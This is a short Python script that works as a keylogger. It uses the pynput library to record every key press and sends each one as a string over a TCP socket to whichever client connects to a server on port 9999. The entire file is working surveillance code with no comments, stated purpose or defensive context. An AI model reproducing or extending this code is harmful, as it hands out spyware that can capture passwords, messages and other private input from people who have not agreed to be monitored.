import socket
from pynput.keyboard import Listener, Key, KeyCode


def convert_key_to_str(key):
    if isinstance(key, Key):
        return str(key)
    elif isinstance(key, KeyCode):
        return f'Key.{key.char}'
    return str(key)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('127.0.0.1', 9999))
server.listen()

client, addr = server.accept()

def show(key):
    global client
    
    key_str = convert_key_to_str(key)
    client.send(key_str.encode('utf-8'))
        
with Listener(on_press = show) as listener:
    listener.join()

server.close()
client.close()